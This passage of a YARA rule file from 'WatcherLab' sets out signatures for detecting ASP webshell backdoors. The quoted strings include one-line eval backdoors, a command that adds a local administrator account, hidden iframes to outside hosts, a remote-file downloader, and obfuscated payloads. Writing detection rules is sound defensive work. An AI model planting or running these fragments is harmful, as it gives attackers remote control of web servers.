        $x3 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
        $s4 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s5 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
        $s6 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s7 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s8 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
        $s9 = "blogurl=\"http://aspmuma.cccpan.com\"" fullword ascii
        $s10 = "RRS\".cmd{background-color:\"&color6&\";color:\"&color7&\"}\"" fullword ascii
        $s11 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
        $s12 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
        $s13 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
        $s14 = "RRS\"input,select,textarea{font-size: 12px;background-color:\"&color3&\";border:1px solid \"&color4&\"}\"" fullword ascii
        $s15 = "e=tlti' am='ssla c)'~~leFipyCo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~` ~ -b></>]<b> /ae<ov>M" fullword ascii
        $s16 = "%></body><iframe src=http://cpc-gov.cn/a/a/a.asp width=0 height=0></iframe></html>" fullword ascii
        $s17 = ": #00fcfc;SCROLLBAR-TRACK-COLOR: #000000;SCROLLBAR-DARKSHADOW-COLOR: #00fcfc;SCROLLBAR-BASE-COLOR: #000000}\"" fullword ascii
        $s18 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
        $s19 = "e=tlti' am='ssla c)'~~leFiitEd~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~`> /al<De'>" fullword ascii
        $s20 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_7cfd184ab099c4d60b13457140493b49c8ba61ee
{
     meta:
        description = "asp - file 7cfd184ab099c4d60b13457140493b49c8ba61ee.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "cb375d1931c9f3557f5c05278806222346dd40d1dd0cd5aff599d25238696149"
     strings:
        $s1 = "AspCoding.Runt \"LANGUAGE=VBSCRIPT,RUNAT=Code,CODEPAGE=gb2312,META=103020\",Application,Request,Response,Server,Session" fullword ascii
        $s2 = "Set AspCoding = Server.CreateObject(\"ASPEncodeDLL.AspCoding\")" fullword ascii
        $s3 = "ZQl6UEpFxAYA56kEyEUQ0D6IYASHX6GA8IsRbB9bEBrFaEmIT6ZH2HUb2R5BlJN67HxHUAmI0b6QRJqbaQE6gICBmFFHRBBH2DEBxgEwAndnE6RIEB6baQVQXESlUEZD" ascii
        $s4 = "If Not IsObject(AspCoding) Then Response.Write \"<script type='text/javascript'>document.write(unescape('%3Cdiv%20style%3D%27FON" ascii
        $s5 = "AspCoding.EnCode(\"X6u6P6XB4HIAkEyEkFEH5BUHuAyIEJaEpRYF0E8FQB4IQJX6GA8IXQD6mI16QgT6o6sRkFZINHZbkFD6mI1Aa60AjDSHDJ2A0AY6FHyEVQd69" ascii
        $s6 = "AspCoding.EnCode(\"yQkEzlVH1636XHzISAaEpDaEqRGFD6T61BV62H1IUHbAa6T63A86LI3RaQaEYRsR5A16364AaHDKtFkEyQaQ2ERA8AZHX6XA36dIlJx6ZHQJa" ascii
        $s7 = "uHGH5I16a6jDbBoHDAIEyEtF4HUBZHxAiI3F4HQK7I7HNI8BmIMIbdaArFyQjDcFbDDHT6S6NbfI6I5HNb4IT6mI1AjDaQjD4HQJGAxAs6mE4HUAN6uI2ATHV6wARJqb" ascii
        $s8 = "xb3AY6SHZbxbTAVHaQ9IhBMIRJaAzDEAVFYE1HXHuI16P6N6SB2HqQRHQgyI0H3BTHGAZI0FyEqR2FGEtFzlrFZFc6HAZFaQjdBozDyED6S6EKQJyISHQK3FDduIVAN6" ascii
        $s9 = "06Z6ZH7Ip65D1AaAqIZI1AkHzB7Hsl76NHm6xDJAZHrEABNH7bGB7btQA6YHfb5btQNEUQEI0BxIVFMAz6VA7IkHrEYE1FuDNDNDGlNEmQNENEHFHEjBGH0ArIHFHE7b" ascii
        $s10 = "dLoeyEFBUI3IjD7I5BVb8AyQUEFB4H76ldoHQJxAjHT6WH2RcIA6w6zl46ZHRJkHaQxdGdofoLrFHblc0HsRxbXAG6T6yQ0EHbmIxHEciASHxApASHo6uQg6RIeIjDVH" ascii
        $s11 = "p65HaHZbNbTlrFmD2EyEtQ6IybyAXI4bmAu67FjljFDHRBDHE6RBDHjl8FxFx6qIlBxKufTQrH0BTEALQiQH4F3ApHSDtE6RdFe6N6YlK6YH0IkHHAX6u60Ax6HFgRAA" ascii
        $s12 = "XlYEkRXlkR5QZDYEkRkR5QYE5QpFXlpFpF5QZD5QpFYEYEYEpFZDZDZDXlYE5QYEYEpFYESlrH1A8FaFdEgRwIkH7IuBXI5IN6aAVFwAu6ZIx6kHqDsDJv1Jgn0g0K7J" ascii
        $s13 = "26jBNHZQJHyH2IMHrB7H4A5FaF5EjRXFzEaFSlkIxISDrQXFPQ6DwIe6eHqDVDjRxFkITExKln1ddnvf2LbfELAMSJTQYQq6TEYEtQsDqFLAkHu67ArI7bYlIbrB2IMH" ascii
        $s14 = "UAGIyQQJmIo66ckH5DV6UH1IW6jDmQ0QtF1FXA0HmBIH3Bu64HW6qDUAaEkEzlyEsRRBsRaQjDkEsRYb1AcH5AmIbBtFZFyQzDyQYI3EaEyEZFG6T6a6vB0HuA4HmH9I" ascii
        $s15 = "YEfAZ6u63Ad6XIxRrQrErRzRpAx606NAYH7buIrEjQtQ3HzAFANHJ6pAqDqFyFsDYEfIN6rIu67FkAYHrQqDjQrE7ArHE6NHIIjHyFjQqDtEYEnIqA0A7I1IZ6NHqITl" ascii
        $s16 = "p6Q6zDlL8dWfcfzD8FFAmA1HT6l6YQjIQAyFaFgDbQfHe6f6rEaFl6z6tQ4AxIrIpAlHjl4HrB26yHN6r61A5H1H2B7ERb3B4bZAB6YH7bVbpQtErQaFalxIrINAm6qA" ascii
        $s17 = "mI1Aa6LAKIuEyEyEUJILALQide5gEfhMRMDofMIe2gGfBnQn8gSK2JmgonPeen1ndL4fHnmfzDrFZDSH76u6Nb1INIaEHbtFV6xIpAf6IArDXErFaQxAV65H0H3Ab6SI" ascii
        $s18 = "FBSImINAM6MAOIeHIgkHrFE636j6EByEVQQg0HNITHmB5HVQrFUFSgaKWnBMenGe1JHn8dMffnLfdLlnfLWM7d7LMvHnHIZH2bAIzDtFXAT6GA36tH3FXAUAN67HxHUA" ascii
        $s19 = "NbGIAIrHqRZFEd3IVQzDlAwLLMInjfUcGdbMTMrAE6rFaQ0EzDaQ6IxbkBub8B3I7HYIjDyEyEJbJbcBKIb6IH4EaQrFHbxAuI2b3A56VIpBtFyEjl2E1DjlyEFBQJ4I" ascii
        $s20 = "QAaFPQdFhIc6SQeHc6yDtExFx6k6QATQZI5INAxH2BrEmBz6mHp6Q6aQeH0HYBeHNb0BqRtQN67HlK4baAlHaQ1I4BqIuI4AxD1QNFNEyErE0Iz6m676jBlHrQtEtEqF" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 700KB and ( 8 of them ) ) or ( all of them )
}

rule d35a793b9520c8766e6c1d578cd4313709db7be3
{
     meta:
        description = "asp - file d35a793b9520c8766e6c1d578cd4313709db7be3.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f8751474732f13b4139d18f33929a7fa88ca7b255455b2fb814fbc1d61ad8a6a"
     strings:
        $s1 = "shell_password = \"devilzc0der\"" fullword ascii
        $s2 = "shell_fake_name = \"Server Logging System\"" fullword ascii
        $s3 = "|z?s&oM)D0 -X2W3QzZ.MfW&31DQ.:$2K;s%0i&HEPLm@#@&J2#0M3oGbhhpVqjS2\\\\WS0UxAhpkE%" fullword ascii
        $s4 = "ASVI0t_4rFlzl5\"Z1Z!wK&_! IM*|Kay_2FWj|jK8o&kn[(Fznkr~L{@#@&JKS,Rh4hbD%8\\2r{eR,/&- O3y}2j\\A1\"cqVj9894!~}S" fullword ascii
        $s5 = "lq a6pJ~[m@#@&J7VbU+ tnrTtYl+Zwair~L{@#@&J)JPL{@#@&JrP'{@#@&EWKD:PEPL{@#@&E7:mDTkU)T~mEOWpEPL{@#@&rdYnaDOCVbL" fullword ascii
        $s6 = "xORLnD2s+snxDAz(9`B[r7{n\\msE# kYHV+cNbdw^lzP{PvUKx+EIJ,[{@#@&EJ,[|@#@&J77(WaRkOX^+ [b/wsCHPxPEr" fullword ascii
        $s7 = "xOAH(Nv4GabN# -mV;+pE,[m@#@&rJPL{@#@&Ji\\CD,tCdbVP{~wKVlc.nw^l1+cBmmhr]K|mBBP2GMYx;h*iEPLm@#@&EiNKmEs+" fullword ascii
        $s8 = "NwK+(KL.7;u302MF8NqzD&[8.Nkb%d&}srP'{@#@&JT?VWgzYWn2(.S\"q\"oQtf9b!TCm3rnV}\\RZ$8g.A+\" NfXo}jrK12!%!9^\"2" fullword ascii
        $s9 = "JJ,&@*rP[|@#@&J@!zDN@*@!&OM@*EPLm@#@&J@!&6WDh@*rP'{@#@&r@!&Dl(V+@*J,'{@#@&E@!JNr-@*JPLm@#@&JJ,'m@#@&J@!Nr\\~^^ld/{EJ4k[[" fullword ascii
        $s10 = "xJrhk9O4)R%uiEJ@*@!bx2ED~YHwnxrJYnaDJEPb[{JE1:9JJ,xmh+{JEmsNEE,\\l^;+{JJrE~/DX^+xJEAbNOt=q!Z]IErPz@*@!JY[@*r~L{@#@&J@!YN,/DzV" fullword ascii
        $s11 = "rU_YYa]+$E+kO *cFrPb@#@&~,P~W(%C:KK }w+U~rM3KrS,:z`Id~Pwl^d+@#@&~P,PG8NCK:KRU+x9@#@&P,P,sGD~r,'~F,PW,SnU~`PG8NCPKh \"+daW" fullword ascii
        $s12 = "SyFHL7v4kOV5&sk%&exJ1pGoJDKoV?$|rf;_dr}+phGaJN\\l[/Tt[Wk\\kcp(.T:w(jTp0draJ,[m@#@&Jz68\\3&jUC)2~S(112h{J.)LMA Un$}NYx6HGWGy" fullword ascii
        $s13 = "(Z9Z:o2zb*njX?VHH9$1BO0+*p(iDSm\\BJ;4ttxS1z&8VWH~?Ds0wx`q?DY3SrP'm@#@&Jw\\25!ph!qC(jtqfYQKTnLx4u,R+\\o&Dp&T&cVNOzn06^zH?.+ZS" fullword ascii
        $s14 = "NFA]t+SM`!4C~6K?3q9HUSpbs[z9!#2;|qujzWEPLm@#@&Eh|ApoHqJQ,RY;bS9#G86zG-h1trd$2+GGTp{tUzw\\\"jb^_8+025jhX[R1+*K(~b^4ND4Z+F" fullword ascii
        $s15 = "-7YtyjA9((MNsVX9C`4HFGe,DEseHHoIA6k|sRT+xm45V0;tp4mJFbA3F&+E,[{@#@&rAOybp.2XO,7E*M*7^Mj5\\(g\\9+\"VmyHD(K9TF\"tV9&CWp(4S}" fullword ascii
        $s16 = "~',J7r~'Pj4;DJ0@#@&i6ODbhP{PP.b:`hz\"+L2X2cInaVmm+v/D.~rJb#@#@&7hHI+T36aRnmOO+Mx,'~.8/MSWPL~JfJ@#@&i6Y.rsPxP:.b:csX\"+oA6a I" fullword ascii
        $s17 = "O hnbo4Y)(W^[irJ@*T@!zd2mx@*@!&l@*@!zD[@*J,[|@#@&d77r@!ON@*9q\"@!&O9@*J~'|@#@&di7r@!O9PkYX^+{EJD+aY lsrTx)1nxD+DpEE@*rPLPa0rs" fullword ascii
        $s18 = "jhowfGQ_GW}6sG:*xGP?&jF/Ow3$g1L0DAK2b\"):._%fobj!qE,[m@#@&rq+2Dn!5qK2}7.Kdovtk\"/T1yz;(nqW_N8S\\65hAzx09sr]XD!sG.1_dG;K7*H" fullword ascii
        $s19 = "FCC2FAnj5.Fbfzf\\o.+4O\\wqUGZ`.nDbVL2WD0,IWC;K|J,'{@#@&Jzfi|RHq_aM*3~5$f9)1R:&QWbLA.kyCWZV:f4oDjj5g&V" fullword ascii
        $s20 = "Qd9|Se;t3J5FnOksT9~2kG+d3xzI1oD\\t#oNoyp%42tA/1ldZS2\\Y[$8AXsxo|(zE~L{@#@&EdVAmo*7_(.3dF&:wbXm(t\"(MX%KJ(s4HN0yzFh$&j%lF9" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule d0e681f68246359ec22cc5228ea9fbe48ec3f257
{
     meta:
        description = "asp - file d0e681f68246359ec22cc5228ea9fbe48ec3f257.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bebea377b96ea3fc3b0bb58082298043fb11c03d61fda5bdfcee064617a04587"
     strings:
        $s1 = "<table width=\"100%\" height=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" bordercolor=\"#FFFFFF\">" fullword ascii
        $s2 = "<body bgcolor=\"#000000\" leftmargin=\"0\" topmargin=\"0\" marginwidth=\"0\" marginheight=\"0\">" fullword ascii
        $s3 = "<% Set FSO = Server.CreateObject(\"Scripting.FileSystemObject\") %>" fullword ascii
        $s4 = "<td><table width=\"700\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"1\">" fullword ascii
        $s5 = "<% Response.write \"<form action='''' method=post>\" %>" fullword ascii
        $s6 = "<% Response.write \"<textarea name=path2 cols=80 rows=15 width=32></textarea>\" %>" fullword ascii
        $s7 = "<%=server.mappath(Request.ServerVariables(\"SCRIPT_NAME\")) %>" fullword ascii
        $s8 = "<%@LANGUAGE=\"VBScript\" CODEPAGE=\"936\"%>" fullword ascii
        $s9 = "<% Response.Write \"<input type=text name=path1 width=200 size=81>\" %>" fullword ascii
        $s10 = "<% Set MyFile=FSO.CreateTextFile(request(\"path1\"),True) %>" fullword ascii
     condition:
        ( uint16(0) == 0x6967 and filesize < 7KB and ( all of them ) ) or ( all of them )
}

rule sig_576c275d0cd96d4911ebe5ca197f85343672bf76
{
     meta:
        description = "asp - file 576c275d0cd96d4911ebe5ca197f85343672bf76.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "abcee820fd8a8ab161d1739f14b70084a4cb689e3f32d3d712f0bf027c4e0ad7"
     strings:
        $x1 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files will be DUMPED Too and From" fullword ascii
        $x2 = "<!-- Copyright Vela iNC. Apr2003 [www.shagzzz.cjb.net] Coded by ~sir_shagalot -->" fullword ascii
        $s3 = "fso.CopyFile Request.QueryString(\"txtpath\") & \"\\\" & Request.Form(\"Fname\"),Target & Request.Form(\"Fname\")" fullword ascii
        $s4 = "fso.CopyFile Target & Request.Form(\"ToCopy\"), Request.Form(\"txtpath\") & \"\\\" & Request.Form(\"ToCopy\")" fullword ascii
        $s5 = "Response.write \"<font face=arial size=-2>You need to click [Create] or [Delete] for folder operations to be</font>\"" fullword ascii
        $s6 = "<form method=post name=frmCopySelected action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s7 = "<BR><center><form method=post action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s8 = "<table><tr><td><%If Request.Form(\"chkXML\") = \"on\"  Then getXML(myQuery) Else getTable(myQuery) %></td></tr></table></form>" fullword ascii
        $s9 = "<form method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" name=\"myform\" >" fullword ascii
        $s10 = "Response.Write \"<tr><td><font color=gray>Type: </font></td><td>\" & File.ContentType & \"</td></tr>\"" fullword ascii
        $s11 = "<BR><input type=text width=40 size=60 name=txtpath value=\"<%=showPath%>\" ><input type=submit name=cmd value=\"  View  \" >" fullword ascii
        $s12 = "Document.frmSQL.txtSQL.value = \"select name as 'TablesListed' from sysobjects where xtype='U' order by name\"" fullword ascii
        $s13 = "<INPUT TYPE=\"SUBMIT\" NAME=cmd VALUE=\"Save As\" TITLE=\"This write to the file specifed and overwrite it without warning.\">" fullword ascii
        $s14 = "<input type=submit name=cmd value=Create><input type=submit name=cmd value=Delete><input type=hidden name=DirStuff value=@>" fullword ascii
        $s15 = "<INPUT type=password name=code ></td><td><INPUT name=submit type=submit value=\" Access \">" fullword ascii
        $s16 = "Document.frmSQL.txtSQL.value = \"SELECT * FROM \" & vbcrlf & \"WHERE \" & vbcrlf & \"ORDER BY \"" fullword ascii
        $s17 = "<form name=frmSQL action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?qa=@\" method=Post>" fullword ascii
        $s18 = "<FORM method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" >" fullword ascii
        $s19 = "if RS.properties(\"Asynchronous Rowset Processing\") = 16 then" fullword ascii
        $s20 = "<td bgcolor=\"#000000\" valign=\"bottom\"><font face=\"Arial\" size=\"-2\" color=gray>NOTE FOR UPLOAD -" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_4476bdc12b6211f2a63fa4e59422b9dbcfcbd998
{
     meta:
        description = "asp - file 4476bdc12b6211f2a63fa4e59422b9dbcfcbd998.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4a695cb067c2f486f2afbb3456ff28c7065a1cfac47a341372455fbfe58cf5f8"
     strings:
        $s1 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>" fullword ascii
     condition:
        ( uint16(0) == 0x533c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule a6a5dc815b5e47e6ce6fc67e3a49ebfeed395498
{
     meta:
        description = "asp - file a6a5dc815b5e47e6ce6fc67e3a49ebfeed395498.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
     strings:
        $x1 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls." fullword ascii
        $s2 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
        $s3 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
        $s4 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><a href=http://\"&siteurl&\" target=_blan" ascii
        $s5 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls.xml" ascii
        $s6 = "j\"</body><iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe></html>\" " fullword ascii
        $s7 = "& 001 / )001 * ))4201 * 4201( / eziSeht((xiF = eziSehTteg: nehT )4201 * 4201 * 4201( < eziSeht dnA )4201 * 4201( => eziSeht fI:" fullword ascii
        $s8 = "& 001 / )001 * ))4201 * 4201 * 4201( / eziSeht((xiF = eziSehTteg: nehT )4201 * 4201 * 4201( => eziSeht fI:)eziSeht(eziSehTteg n" fullword ascii
        $s9 = "j\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\">\"" fullword ascii
        $s10 = "& 001 / )001 * )4201 / eziSeht((xiF = eziSehTteg: nehT )4201 * 4201( < eziSeht dnA 4201 => eziSeht fI:fi dne:" fullword ascii
        $s11 = ">->der=roloc tnof<>'emarFeliF'=tegrat '/ukout/rekc4h/moc.pxeyado//:ptth'=ferh a<>'22'=thgieh dt<>rt<" fullword ascii
        $s12 = "str1=\"\"&Request.ServerVariables(\"SERVER_Name\"):BackUrl=\"<br><br><center><a href='javascript:history.back()'>" fullword ascii
        $s13 = ":ExeCuTe(ShiSanFun(ShiSan)):" fullword ascii
        $s14 = "---LQS>->'emarFeliF'=tegrat '/lqs/rekc4h/moc.pxeyado//:ptth'=ferh a<>'22'=thgieh dt<>rt<" fullword ascii
        $s15 = "(redloFwohS:tpircsavaj'=ferh a<> 59=htdiw d=di dt<>rt<>0=redrob elbat<>retnec=ngila " fullword ascii
        $s16 = "& eltiTrts = eltiTrts:eltiTrts miD:)htaPrewoP,enOeht(eltiTyMteg noitcnuF:bus dne:gnihtoN = eliFeht teS:)htaPrewoP,eliFeht(eltiT" fullword ascii
        $s17 = "taPrewoP,eulaVtni(setubirttAteg noitcnuF:noitcnuF dnE:eltiTrts = eltiTyMteg:)htaPrewoP,setubirttA.enOeht(setubirttAteg & " fullword ascii
        $s18 = "response.Redirect \"http://\"&serveru&\"/global.asa\"" fullword ascii
        $s19 = ">d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'redavni'=eulav 'resut'=di 'xoBtxeT'=ssalc 'txet'=epyt 'resut'=eman tupni<>d=di dt<>dt/<" fullword ascii
        $s20 = ">d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'1'=eulav 'ssap'=di 'xoBtxeT'=ssalc 'txet'=epyt 'ssapt'=eman tupni<>d=di dt<>dt/<" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule c6e94fcb61ad2df3568d0a5c11ad7b66c835e2f9
{
     meta:
        description = "asp - file c6e94fcb61ad2df3568d0a5c11ad7b66c835e2f9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "11f99de56dc30a2ebb9dba00fa77cfbc8c628d6c84104d7dc1727962a1bf7c87"
     strings:
        $s1 = "http://hi.baidu.com/xahacker/fuck.txt" fullword ascii
        $s2 = "sGet.SaveToFile Server.MapPath(" fullword ascii
        $s3 = "sGet.Write(xPost.responseBody)" fullword ascii
        $s4 = "xPost.Open " fullword ascii
        $s5 = "sGet.Type = 1" fullword ascii
        $s6 = "sGet.Mode = 3" fullword ascii
        $s7 = "sGet.Open()" fullword ascii
        $s8 = "xPost.Send()" fullword ascii
        $s9 = "Set xPost = CreateObject(" fullword ascii
        $s10 = "Set sGet = CreateObject(" fullword ascii
        $s11 = "Microsoft.XMLHTTP" fullword ascii
        $s12 = "set sGet = nothing" fullword ascii
        $s13 = "set sPOST = nothing" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( 8 of them ) ) or ( all of them )
}

rule sig_3eab1798cbc9ab3b2c67d3da7b418d07e775db70
{
     meta:
        description = "asp - file 3eab1798cbc9ab3b2c67d3da7b418d07e775db70.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "791a882af2cea0aa8b8379791b401bebc235296858266ddb7f881c8923b7ea61"
     strings:
        $s1 = ";<%execute(request(\"cmd\"))%>" fullword ascii
        $s2 = "<?php eval($_POST[cmd]);?>" fullword ascii
     condition:
        ( uint16(0) == 0x4947 and filesize < 10KB and ( all of them ) ) or ( all of them )
}

rule sig_2f2f5857f76a096b6bb38c6d8cdc567b9e8ab6d2
{
     meta:
        description = "asp - file 2f2f5857f76a096b6bb38c6d8cdc567b9e8ab6d2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c45d67615643b285ec4e1fb5f5195b7d3f5ca8c9bf41d328dca7396641bfc6d7"
     strings:
        $s1 = "vY;l,&Om]!*F+0m]!*W!9{Y;F,o!u+ u +YyZsHCs+Y OY2AOKwctk9+6GDsRo1m:n 7lV!n]y!_uf9]y!u +]++uG/]F/]FZY{;] +Yy QfgCs+Y2AuGf" fullword ascii
        $s2 = "RZF~ 2FP *2P c2~c%f,RlFF,RlqF,R{,,R+q8PRWqF,RFZq~RlF8P Gqq,R0&, c2P q+PR+q8P %2~ccf,RR&PcG8qPc%fPccf~cFv, G8FPcf" fullword ascii
        $s3 = "[E@!&WKxO@*@!&0KxO@*@!zmnUD+.@*@!4MP^KVKD'[cy* W ~/bynx8P@*rlI\"?J@!&ON@*@!JY.@*El&0~r(P`Z~qb{JP" fullword ascii
        $s4 = "PW(%o0@#@&,P~PdOMss1mh+{rUnwkVn glh+@#@&,P~,q6P/DDws1m:n@!@*J[nk3YK2Rbxkr~3pjPkY.ssHm:n@!@*E0KV[nMRtOOrPPt" fullword ascii
        $s5 = "X{JPLP78mMVW@#@&VnC7+/,xP^+l7ndPLPrOj2PiU2]?APjhJ~',\\4^.^0~[,E qK{!c!RZRZEPLP-41DsW,[PrRnKDYgGxJ,[,Y2W.O,[~\\(^D^0~',JOid" fullword ascii
        $s6 = "~f(HCxmon.v#@#@&~PU;VUO.':Db:cIn5!+dYcoWM:cEU;VjOMJb#@#@&,P9(?DD'\"+$;+kY sKDhcrf4UODr#@#@&~~?&'Uq'J@!Om4s+,Ak9Y4xEv*Tv,P8WM[" fullword ascii
        $s7 = "[O2@#@&KyRKGkkYbGx,'PZ~lP: cKzwn~{P+@#@&P cZ4CM/+O~{JL4yf8 E@#@&Us.,',P cInl9KnaD@#@&:+R;VWkn@#@&b0,fqR3ab/O/viwglhn*PY4n" fullword ascii
        $s8 = "PJV2:E~,J4YDwl&JF F !c!R8lEPLPaW.Y~',J&oKsNkEU&!wl[hbx&/8EBK.!+BPJr~,EJ@#@&CRk+U[,VWTrx!/+M~'P^WTkUwCdkP'PsOPLP[n^NWhCbx~[,U" fullword ascii
        $s9 = "xD+D@*B*IJ@#@&]IUJdnDKksnW!Y`rE[W1Es+UY C^V oKsNkEU kE4hrD`birEBcTZ!*iJ@#@&\"]?r@!&/1Dr2D@*J@#@&mm/+,f@#@&k+DP^'jnM\\nDc/D" fullword ascii
        $s10 = "PxPrOj3:frt)qgJPL~-4;Dd0~[~E fG:mrx{oGs9/EUkZRTRZ ZuE,[,0YawK.Y,[~J-Oqk8u!r~[,\\4;.J0,[,JRKt6AxC4^n'ZJ~',\\4/.d0~[,E,Kt}|" fullword ascii
        $s11 = "zMz6rP9xn&Cz-Mw0Wwe'x*-M'+9WHTE(nf&-M-vxGrk/+kl#4YlhOT!\"`,NU+jss(&eJU+4Y~wC-3GwC-~@*@!~*-M'+9WHTE(nf&-M-vxGrk/+k~0bzeJwM-@*D" fullword ascii
        $s12 = "6D/tmD/W9+bb,@#@&bqP{Pk8~QP8P@#@&3x[~&0~@#@&H+XY~@#@&4XOnk $?:],'~kYMI+DEMUP@#@&~P,P3.MRZ^nlM@#@&AU[PwE" fullword ascii
        $s13 = "*R{|];W2wv]!G+0c|];*8v0muE*WTf|]EF1o!u y]+ Y+;sHlsn]y,Yf~YW2 4k[+6GM: w1m:+c\\msE" fullword ascii
        $s14 = ".KlDtr#xI]nhlOtvoW^Nn.hlY4b=2UN,(6)(6PU+/kkKU`rsGV9+.KmYtrb'rJP:4nx=sKV[+.KmY4'\"GWDnCO4)?ndkkGxvEwWs9+MnlDtrb'wWsN" fullword ascii
        $s15 = "FName=Request(\"FName\")#@~^F24BAA==@#@&@#@&~l13jMV{E@!(D@*@!(D@*@!1+xDnD@*@!l,4.+6'ELC\\Cd1DrwDltb/OGMXR8C13c#E@*" fullword ascii
        $s16 = "v@*fnV@!&l@*J@#@&Uq'j(LJ~@!m~4Dn6'ELl7lk^DbwO)wEsswWDscJrJ[\"nKlDtvnCY4'r-E[w 1m:nbLJJESrJ\\W7nwWs9+MJJ*BKUm^k^3{B.nDED" fullword ascii
        $s17 = "'ZJPLP78mMVWPLPER\"lYbGja'Fr~'P741Ds0~',{@#@&rRImYrGGWhUx8J~[,-(m.^0,[PrO\"CYbWdZM+[rD'!r~[,\\41.s0,[,JRp;GDl/EM.+" fullword ascii
        $s18 = "hPz.DmX`8+biUYM$TT~x,JEnMG\\bNn.{Hk^.K/G0D x+Ocrd2f~RW !pfCYmPjG!Dm" fullword ascii
        $s19 = "nfbDRgCh+@#@&,P~P(W,/ODw[1m:n@!@*JZGU6kLRtdbJ~ApjP/DDw[1m:n@!@*J]3;5Zd3frP25#~/DDwNHlhn@!@*EIA/5;S3]rP2}#,/ODw[glh" fullword ascii
        $s20 = "br@#@&j({?([r@!JY[@*@!JYD@*J@#@&?&!xJ@!Y.@*@!YN,4+botDxEJy!rJ~4L^KVGD{EJ[soowssEE,mGVk2mxxrJyJJ@*P@!&Y9@*@!zDD@*E,@#@&" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_0af2e6045d10daf5d100f8ae15ee70933bc72e95
{
     meta:
        description = "asp - file 0af2e6045d10daf5d100f8ae15ee70933bc72e95.asp"
